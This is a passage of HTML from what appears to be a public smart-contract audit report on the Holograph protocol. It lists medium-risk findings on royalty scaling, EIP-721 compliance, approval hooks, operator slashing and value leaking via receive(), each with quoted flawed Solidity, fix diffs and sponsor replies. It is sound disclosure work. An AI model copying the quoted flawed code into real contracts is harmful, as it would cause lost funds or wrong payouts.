href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/PA1D.sol#L665-L675\">PA1D.sol#L665-L675</a><br></p>\n<p><code>bidShares</code> returned are incorrect leading to incorrect royalties.</p>\n<h3 id=\"proof-of-concept-13\" style=\"position:relative;\"><a href=\"#proof-of-concept-13\" aria-label=\"proof of concept 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://etherscan.io/address/0xe5bfab544eca83849c53464f85b7164375bdaac1#code#F1#L113\">Zora Market</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function isValidBidShares(BidShares memory bidShares)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    public</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    pure</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    override</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    returns (bool)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    return</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bidShares.creator.value.add(bidShares.owner.value).add(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            bidShares.prevOwner.value</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ) == uint256(100).mul(Decimal.BASE);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Above you can see the Zora market lines that validate bidShares, which shows that Zora market bidShare.values should be percentages written out to 18 decimals. However PA1D#bidSharesForToken sets the bidShares.creator.value to the raw basis points set by the owner, which is many order of magnitudes different than expected.</p>\n<h3 id=\"recommended-mitigation-steps-21\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-21\" aria-label=\"recommended mitigation steps 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>To return the proper value, basis points returned need to be adjusted. Convert from basis points to percentage by dividing by 10 ** 2 (100) then scale to 18 decimals. The final result it to multiple the basis point by 10 ** (18 - 2) or 10 ** 16:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function bidSharesForToken(uint256 tokenId) public view returns (ZoraBidShares memory bidShares) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // this information is outside of the scope of our</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bidShares.prevOwner.value = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bidShares.owner.value = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (_getReceiver(tokenId) == address(0)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-       bidShares.creator.value = _getDefaultBp();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+       bidShares.creator.value = _getDefaultBp() * (10 ** 16);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    } else {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-       bidShares.creator.value = _getBp(tokenId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+       bidShares.creator.value = _getBp(tokenId) * (10 ** 16);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    return bidShares;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/180#issuecomment-1307823222\">alexanderattar (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>Good catch! We’ll implement the suggested solution.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/180#ref-pullrequest-1469977783\">alexanderattar (Holograph) linked a PR</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/holographxyz/holograph-protocol/pull/93\">Feature/holo 612 royalty smart contract improvements</a></p>\n</blockquote>\n<hr>\n<h2 id=\"m-15-holographerc721safetransferfrom-not-compliant-with-eip-721\" style=\"position:relative;\"><a href=\"#m-15-holographerc721safetransferfrom-not-compliant-with-eip-721\" aria-label=\"m 15 holographerc721safetransferfrom not compliant with eip 721 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/203\">[M-15] <code>HolographERC721.safeTransferFrom</code> not compliant with EIP-721</a></h2>\n<p><em>Submitted by Lambda</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/24bc4d8dfeb6e4328d2c6291d20553b1d3eff00b/src/enforcer/HolographERC721.sol#L366\">HolographERC721.sol#L366</a><br></p>\n<p>According to EIP-721, we have the following for <code>safeTransferFrom</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///  (...) When transfer is complete, this function</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///  checks if `_to` is a smart contract (code size &gt; 0). If so, it calls</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///  `onERC721Received` on `_to` and throws if the return value is not</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///  `bytes4(keccak256(&quot;onERC721Received(address,address,uint256,bytes)&quot;))`.</span></span></span></code></pre>\n<p>According to the specification, the function must therefore always call <code>onERC721Received</code>, not only when it has determined via ERC-165 that the contract provides this function. Note that in the EIP, the provided interface for <code>ERC721TokenReceiver</code> does not mention ERC-165. For the token itself, we have: <code>interface ERC721 /* is ERC165 */ {</code><br>\nHowever, for the receiver, the provided interface there is just: <code>interface ERC721TokenReceiver {</code><br>\nThis leads to failed transfers when they should not fail, because many receivers will just implement the <code>onERC721Received</code> function (which is sufficient according to the EIP), and not <code>supportsInterface</code> for ERC-165 support.</p>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<p>Let’s say a receiver just implements the <code>IERC721Receiver</code> from OpenZeppelin: <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/IERC721Receiver.sol\">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/IERC721Receiver.sol</a><br>\nLike the provided interface in the EIP itself, this interface does not derive from EIP-165. All of these receivers (which are most receivers in practice) will not be able to receive those tokens, because the <code>require</code> statement (that checks for ERC-165 support) reverts.</p>\n<h3 id=\"recommended-mitigation-steps-22\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-22\" aria-label=\"recommended mitigation steps 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Remove the ERC-165 check in the <code>require</code> statement (like OpenZeppelin does: <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L436\">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L436</a>).</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/203#issuecomment-1307809122\">alexanderattar (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>This will be updated to be fully ERC721 compliant</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/203#ref-pullrequest-1452472274\">ACC01ADE (Holograph) linked a PR</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/holographxyz/holograph-protocol/pull/88\">Feature/HOLO-605: C4 medium risk fixes</a></p>\n</blockquote>\n<hr>\n<h2 id=\"m-16-approvalall-event-is-missing-parameters\" style=\"position:relative;\"><a href=\"#m-16-approvalall-event-is-missing-parameters\" aria-label=\"m 16 approvalall event is missing parameters permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/270\">[M-16] <code>ApprovalAll</code> event is missing parameters</a></h2>\n<p><em>Submitted by bin2chen</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/HolographERC721.sol#L392\">HolographERC721.sol#L392</a><br></p>\n<p><code>beforeApprovalAll()</code> / <code>afterApprovalAll()</code> can only pass “to” and “approved”, missing “owner”, if contract listening to this event,but does not know who approve it, so can not react to this event.<br>\nBasically, this event cannot be used.</p>\n<h3 id=\"proof-of-concept-15\" style=\"position:relative;\"><a href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function setApprovalForAll(address to, bool approved) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">....</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (_isEventRegistered(HolographERC721Event.beforeApprovalAll)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      require(SourceERC721().beforeApprovalAll(to, approved)); /***** only to/approved ,need owner</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _operatorApprovals[msg.sender][to] = approved;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (_isEventRegistered(HolographERC721Event.afterApprovalAll)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      require(SourceERC721().afterApprovalAll(to, approved)); /***** only to/approved ,need owner</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-23\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-23\" aria-label=\"recommended mitigation steps 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Add parameter: owner</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">interface HolographedERC721 {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">- function beforeApprovalAll(address _to, bool _approved) external returns (bool success);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+ function beforeApprovalAll(address owner, address _to, bool _approved) external returns (bool success);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">- function afterApprovalAll(address _to, bool _approved) external returns (bool success);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+ function afterApprovalAll(address owner, address _to, bool _approved) external returns (bool success);</span></span></code></pre>\n<!---->\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function setApprovalForAll(address to, bool approved) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (_isEventRegistered(HolographERC721Event.beforeApprovalAll)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-     require(SourceERC721().beforeApprovalAll(to, approved)); </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+     require(SourceERC721().beforeApprovalAll(msg.sender,to, approved)); </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _operatorApprovals[msg.sender][to] = approved;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (_isEventRegistered(HolographERC721Event.afterApprovalAll)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-      require(SourceERC721().afterApprovalAll(to, approved));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+      require(SourceERC721().afterApprovalAll(msg.sender,to, approved));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/270#issuecomment-1306696158\">alexanderattar (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>Good catch. This will be updated so that <code>beforeApprovalAll</code> and <code>afterApprovalAll</code> passes in owner.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/270#ref-pullrequest-1452472274\">ACC01ADE (Holograph) linked a PR</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/holographxyz/holograph-protocol/pull/88\">Feature/HOLO-605: C4 medium risk fixes</a></p>\n</blockquote>\n<hr>\n<h2 id=\"m-17-wrong-slashing-calculation-rewards-for-operator-that-did-not-do-his-job\" style=\"position:relative;\"><a href=\"#m-17-wrong-slashing-calculation-rewards-for-operator-that-did-not-do-his-job\" aria-label=\"m 17 wrong slashing calculation rewards for operator that did not do his job permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/307\">[M-17] Wrong slashing calculation rewards for operator that did not do his job</a></h2>\n<p><em>Submitted by peanuts, also found by ctf_sec, imare, and Jeiwan</em></p>\n<p>Wrong slashing calculation may create unfair punishment for operators that accidentally forgot to execute their job.</p>\n<h3 id=\"proof-of-concept-16\" style=\"position:relative;\"><a href=\"#proof-of-concept-16\" aria-label=\"proof of concept 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://docs.holograph.xyz/holograph-protocol/operator-network-specification\">Docs</a>: If an operator acts maliciously, a percentage of their bonded HLG will get slashed. Misbehavior includes (i) downtime, (ii) double-signing transactions, and (iii) abusing transaction speeds. 50% of the slashed HLG will be rewarded to the next operator to execute the transaction, and the remaining 50% will be burned or returned to the Treasury.</p>\n<p>The docs also include a guide for the number of slashes and the percentage of bond slashed. However, in the contract, there is no slashing of percentage fees. Rather, the whole _getBaseBondAmount() fee is <a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L374-L382\">slashed from the job.operator instead.</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount = _getBaseBondAmount(pod);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        /**</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         * @dev select operator that failed to do the job, is slashed the pod base fee</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _bondedAmounts[job.operator] -= amount;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        /**</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         * @dev the slashed amount is sent to current operator</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _bondedAmounts[msg.sender] += amount;</span></span></code></pre>\n<p>Documentation states that only a portion should be slashed and the number of slashes should be noted down.</p>\n<h3 id=\"recommended-mitigation-steps-24\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-24\" aria-label=\"recommended mitigation steps 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Implement the correct percentage of slashing and include a mapping to note down the number of slashes that an operator has.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/307#issuecomment-1306684590\">alexanderattar (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>Valid. The docs are not in sync with the code, but it will be adjusted to handle this correctly.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/307#issuecomment-1351759231\">alexanderattar (Holograph) resolved and commented</a>:</strong></p>\n<blockquote>\n<p>We have changed the slashing logic to use base bonding amount instead of percentage based approach.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-18-leak-of-value-when-interacting-with-an-erc721-enforcer-contract\" style=\"position:relative;\"><a href=\"#m-18-leak-of-value-when-interacting-with-an-erc721-enforcer-contract\" aria-label=\"m 18 leak of value when interacting with an erc721 enforcer contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/468\">[M-18] Leak of value when interacting with an ERC721 enforcer contract</a></h2>\n<p><em>Submitted by Trust</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L962\">HolographERC721.sol#L962</a><br></p>\n<p>HolographERC721.sol is an enforcer of the ERC721 standard. In its fallback function, it calls the actual implementation in order to handle additional logic.</p>\n<p>If Holographer is called with no calldata and some msg.value, the call will reach the  receive() function, which does not forward the call down to the implementation.</p>\n<p>This can be a serious value leak issue, because the underlying implementation may have valid behavior for handling sending of value. For example, it can mint the next available tokenID and credit it to the user. Since this logic is never reached, the entire msg.value is just leaked.</p>\n<h3 id=\"impact-10\" style=\"position:relative;\"><a href=\"#impact-10\" aria-label=\"impact 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Leak of value when interacting with an NFT using the receive() or fallback() callback. Note that if NFT implements fallback OR receive() function, execution will never reach either of them from the enforcer’s receive() function.</p>\n<h3 id=\"recommended-mitigation-steps-25\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-25\" aria-label=\"recommended mitigation steps 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Funnel receive() empty calls down to the implementation.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/468#issuecomment-1306627063\">alexanderattar (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>Receive function will need to be updated to pass value down like the fallback function</p>\n</blockquote>\n<p><strong><a 